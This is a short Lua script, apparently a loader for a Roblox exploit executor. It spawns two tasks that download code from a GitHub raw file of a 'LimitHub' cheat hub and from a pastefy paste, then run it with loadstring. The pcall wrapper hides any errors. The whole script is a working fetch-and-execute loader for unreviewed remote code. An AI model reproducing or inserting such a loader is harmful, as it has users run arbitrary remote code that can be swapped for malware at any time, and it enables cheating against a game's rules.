pcall(function()
    -- Delayed script
    task.spawn(function()
        task.wait(8)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua'))()
    end)

    -- Immediate script
    task.spawn(function()
        loadstring(game:HttpGet("https://pastefy.app/G5j1Jn9m/raw"))()
    end)
end)
